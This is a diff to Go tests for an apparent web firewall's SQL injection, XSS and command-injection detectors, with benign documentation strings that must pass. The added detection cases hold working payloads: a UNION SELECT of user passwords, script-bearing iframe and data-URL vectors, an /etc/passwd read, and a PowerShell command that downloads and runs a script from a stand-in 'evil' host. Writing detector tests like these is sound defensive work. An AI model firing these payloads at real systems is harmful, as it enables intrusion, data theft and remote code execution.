@@ -29,6 +29,7 @@ func TestSQLDetectorBlocksFunctionBasedPayloads(t *testing.T) {
 		"/search?q=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))",
 		"/login?u=admin'%3Bselect%20pg_sleep(5)--",
 		"/search?q=1%20or%20char(49)%3Dchar(49)",
+		"/search?q=1%20/*!50000UNION*/%20/*!50000SELECT*/%20password%20from%20users",
 	}
 	for _, target := range cases {
 		t.Run(target, func(t *testing.T) {
@@ -49,18 +50,26 @@ func TestSQLDetectorBlocksFunctionBasedPayloads(t *testing.T) {
 }
 
 func TestSQLDetectorKeepsBenignDocumentationClean(t *testing.T) {
-	req, _ := http.NewRequest(http.MethodPost, "/docs", bytes.NewBufferString(`{"text":"The char() and concat() SQL functions are documented here."}`))
-	req.Header.Set("Content-Type", "application/json")
-	reqCtx, err := engine.NewRequestContext(req, "default")
-	if err != nil {
-		t.Fatal(err)
+	cases := []string{
+		`{"text":"The char() and concat() SQL functions are documented here."}`,
+		`{"text":"SQL tutorials may show /* block comments */ and -- line comments without executable user input."}`,
 	}
-	result, err := NewSQLDetector("block").Detect(context.Background(), reqCtx)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if result != nil {
-		t.Fatalf("expected benign SQL documentation to pass, got %+v", result)
+	for _, body := range cases {
+		t.Run(body, func(t *testing.T) {
+			req, _ := http.NewRequest(http.MethodPost, "/docs", bytes.NewBufferString(body))
+			req.Header.Set("Content-Type", "application/json")
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := NewSQLDetector("block").Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if result != nil {
+				t.Fatalf("expected benign SQL documentation to pass, got %+v", result)
+			}
+		})
 	}
 }
 
@@ -225,6 +234,8 @@ func TestXSSDetectorBlocksObfuscatedBrowserContexts(t *testing.T) {
 	cases := []string{
 		"/?next=%3Ca%20href%3Djava%00script%3Aalert(1)%3Ego%3C%2Fa%3E",
 		"/?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert(1)%26gt%3B",
+		"/?next=%3Cobject%20data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3E",
+		"/?frame=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E",
 	}
 	for _, target := range cases {
 		t.Run(target, func(t *testing.T) {
@@ -245,18 +256,28 @@ func TestXSSDetectorBlocksObfuscatedBrowserContexts(t *testing.T) {
 }
 
 func TestXSSDetectorKeepsBenignDocumentationClean(t *testing.T) {
-	req, _ := http.NewRequest(http.MethodPost, "/docs", bytes.NewBufferString(`{"text":"This page explains why javascript: URLs are dangerous, but includes no tag attribute."}`))
-	req.Header.Set("Content-Type", "application/json")
-	reqCtx, err := engine.NewRequestContext(req, "default")
-	if err != nil {
-		t.Fatal(err)
+	cases := []string{
+		`{"text":"This page explains why javascript: URLs are dangerous, but includes no tag attribute."}`,
+		`{"text":"The iframe element is documented here as markup text, without srcdoc, data URLs, or event handlers."}`,
+		`{"text":"Example markup: <iframe src=\"https://example.com\"></iframe> shows embedding syntax."}`,
+		`{"text":"data:text/html examples are discussed as documentation, not embedded in an executable HTML attribute."}`,
 	}
-	result, err := NewXSSDetector("block").Detect(context.Background(), reqCtx)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if result != nil {
-		t.Fatalf("expected benign XSS documentation to pass, got %+v", result)
+	for _, body := range cases {
+		t.Run(body, func(t *testing.T) {
+			req, _ := http.NewRequest(http.MethodPost, "/docs", bytes.NewBufferString(body))
+			req.Header.Set("Content-Type", "application/json")
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := NewXSSDetector("block").Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if result != nil {
+				t.Fatalf("expected benign XSS documentation to pass, got %+v", result)
+			}
+		})
 	}
 }
 
@@ -285,6 +306,56 @@ func TestPhase2SemanticDetectors(t *testing.T) {
 			}
 			if result == nil || !result.Detected || result.Category != tc.category {
 				t.Fatalf("expected %s detection, got %+v", tc.category, result)
+			}
+		})
+	}
+}
+
+func TestRCEDetectorBlocksObfuscatedCommandPayloads(t *testing.T) {
+	cases := []string{
+		"/run?cmd=cat%24%7BIFS%7D/etc/passwd",
+		"/run?cmd=cmd%20/c%20whoami",
+		"/run?cmd=bash%20-c%20'id'",
+		"/run?cmd=powershell%20-NoP%20-W%20hidden%20-Command%20IEX(New-Object%20Net.WebClient).DownloadString('http://evil/p.ps1')",
+		"/run?cmd=pwsh%20-EncodedCommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA",
+	}
+	for _, target := range cases {
+		t.Run(target, func(t *testing.T) {
+			req, _ := http.NewRequest(http.MethodGet, target, nil)
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := NewRCEDetector("block").Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if result == nil || !result.Detected || result.Category != "rce" {
+				t.Fatalf("expected RCE detection, got %+v", result)
+			}
+		})
+	}
+}
+
+func TestRCEDetectorKeepsBenignCommandDocumentationClean(t *testing.T) {
+	cases := []string{
+		`{"text":"PowerShell EncodedCommand and cmd /c are documented for defenders, without a runnable payload."}`,
+		`{"text":"Use curl https://example.com/install.sh to download an installer, then review it manually."}`,
+	}
+	for _, body := range cases {
+		t.Run(body, func(t *testing.T) {
+			req, _ := http.NewRequest(http.MethodPost, "/docs", bytes.NewBufferString(body))
+			req.Header.Set("Content-Type", "application/json")
+			reqCtx, err := engine.NewRequestContext(req, "default")
+			if err != nil {
+				t.Fatal(err)
+			}
+			result, err := NewRCEDetector("block").Detect(context.Background(), reqCtx)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if result != nil {
+				t.Fatalf("expected benign RCE documentation to pass, got %+v", result)
 			}
 		})
 	}
